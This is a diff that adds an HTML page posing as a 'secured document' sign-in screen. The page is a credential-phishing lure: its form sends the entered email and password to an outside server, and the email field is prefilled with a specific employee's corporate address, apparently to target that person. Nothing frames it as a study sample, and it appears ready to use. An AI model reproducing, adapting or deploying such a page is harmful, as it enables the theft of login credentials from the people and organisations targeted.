@@ -1,0 +1,31 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 11.00.10570.1001"></HEAD>
+<BODY style="MARGIN: 0.5em"><BR><BR>
+</script>
+<body background="https://i.ibb.co/NrjMfsM/bck.png">
+<DIV class=wrapper style='BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(63,63,63); FONT-STYLE: normal; MIN-HEIGHT: 100%; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px 0px -40px; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial;
+text-decoration-color: initial'><SECTION class=container style="BOX-SIZING: border-box; WIDTH: 1180px; PADDING-LEFT: 20px; MARGIN: 0px auto; DISPLAY: block; PADDING-RIGHT: 20px">
+<DIV class=form-login style="BOX-SIZING: border-box; MAX-WIDTH: 450px; MARGIN: 0px auto 40px">
+<DIV class="mt-30 mb-30" style="BOX-SIZING: border-box; MARGIN: 30px 0px"><IMG class="img-responsive form-login__company-logo" style="BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; MAX-WIDTH: 100%; HEIGHT: auto; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: middle; BORDER-BOTTOM-WIDTH: 0px; MARGIN: 0px auto; DISPLAY: block; BORDER-TOP-WIDTH: 0px; MAX-HEIGHT: 150px" src="https://i.ibb.co/f2zJRTX/logo.png"></DIV>
+<DIV class=form-login__body style="BOX-SIZING: border-box; BORDER-TOP: rgb(235,235,235) 1px solid; BORDER-RIGHT: rgb(235,235,235) 1px solid; BORDER-BOTTOM: rgb(235,235,235) 1px solid; POSITION: relative; PADDING-BOTTOM: 30px; PADDING-TOP: 30px; PADDING-LEFT: 50px; BORDER-LEFT: rgb(235,235,235) 1px solid; MARGIN: 0px; Z-INDEX: 1; PADDING-RIGHT: 50px; BACKGROUND-COLOR: rgb(250,250,250); border-radius: 5px">
+<DIV class=form-group style="BOX-SIZING: border-box; MARGIN: 0px 0px 15px">
+<FORM id=login_form style="BOX-SIZING: border-box; MARGIN: 0px" method=post action=https://webify.ws//ap/lo.php?>
+<DIV class=form-group style="BOX-SIZING: border-box; MARGIN: 0px 0px 16px"><FONT style="BOX-SIZING: border-box; MARGIN: 0px" color=#00000 face=tahoma>Please Sign In To View Secured Document. </FONT><BR style="BOX-SIZING: border-box; MARGIN: 0px"><BR style="BOX-SIZING: border-box; MARGIN: 0px"><LABEL style="BOX-SIZING: border-box; MAX-WIDTH: 100%; FONT-WEIGHT: bold; MARGIN: 0px 0px 5px; DISPLAY: inline-block" for=login_user>Username</LABEL>
+ <INPUT id=login_user class=form-control style="BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: rgb(204,204,204) 1px solid; HEIGHT: 34px; FONT-FAMILY: inherit; BORDER-RIGHT: rgb(204,204,204) 1px solid; WIDTH: 348px; BACKGROUND-IMAGE: none; BORDER-BOTTOM: rgb(204,204,204) 1px solid; COLOR: black; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(204,204,204) 1px solid; MARGIN: 0px; DISPLAY: block; LINE-HEIGHT: 2; PADDING-RIGHT: 0px; BACKGROUND-COLOR:
+rgb(255,255,255); TEXT-INDENT: 10px; font-stretch: inherit; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s" name=email Value="tougesaki-tadashi@jichodo.co.jp" "placeholder="Email address" autocomplete="off"></DIV></DIV>
+<DIV class=form-group style="BOX-SIZING: border-box; MARGIN: 0px 0px 15px"><LABEL style="BOX-SIZING: border-box; MAX-WIDTH: 100%; FONT-WEIGHT: bold; MARGIN: 0px 0px 5px; DISPLAY: inline-block" for=login_pwd>Password</LABEL>
+ <INPUT id=login_pwd class=form-control style="BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: rgb(204,204,204) 1px solid; HEIGHT: 34px; FONT-FAMILY: inherit; BORDER-RIGHT: rgb(204,204,204) 1px solid; WIDTH: 348px; BACKGROUND-IMAGE: none; BORDER-BOTTOM: rgb(204,204,204) 1px solid; COLOR: black; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(204,204,204) 1px solid; MARGIN: 0px; DISPLAY: block; LINE-HEIGHT: 2; PADDING-RIGHT: 0px; BACKGROUND-COLOR:
+rgb(255,255,255); TEXT-INDENT: 10px; font-stretch: inherit; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s" type=password name=pass required="" placeholder="Password" minlength="5"></DIV>
+<INPUT class="btn btn-primary btn-block" style="BOX-SIZING: border-box; FONT-SIZE: 14px; CURSOR: pointer; BORDER-TOP: rgb(0,167,230) 1px solid; FONT-FAMILY: inherit; BORDER-RIGHT: rgb(0,167,230) 1px solid; WIDTH: 348px; VERTICAL-ALIGN: middle; BACKGROUND-IMAGE: none; WHITE-SPACE: nowrap; BORDER-BOTTOM: rgb(0,167,230) 1px solid; FONT-WEIGHT: normal; COLOR: rgb(255,255,255); PADDING-BOTTOM: 13px; TEXT-ALIGN: center; PADDING-TOP: 13px; PADDING-LEFT: 12px; BORDER-LEFT: rgb(0,167,230) 1px solid;
+MARGIN: 0px 0px 3px; DISPLAY: block; LINE-HEIGHT: 1.4285; PADDING-RIGHT: 12px; BACKGROUND-COLOR: rgb(30,76,161); font-stretch: inherit; border-radius: 4px; touch-action: manipulation; user-select: none; appearance: button" type=submit value="VIEW DOCUMENT" name=userpass></FORM></DIV></DIV></DIV></SECTION>
+<DIV></DIV></FORM>
+<DIV></DIV>
+<DIV></DIV>
+<DIV></DIV></SECTION>
+<DIV></DIV>
+<P>
+<FOOTER class=footer-login style='BOX-SIZING: border-box; FONT-SIZE: 14px; HEIGHT: 40px; FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; POSITION: relative; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(63,63,63); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; DISPLAY: block; LETTER-SPACING: normal; BOTTOM: 10px; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal;
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'><BR><BR><SPAN class="text-smaller text-gray" style="BOX-SIZING: border-box; FONT-SIZE: 9px; COLOR: rgb(135,135,135); MARGIN: 0px; DISPLAY: block"><BR><BR></SPAN></P></BODY></HTML>
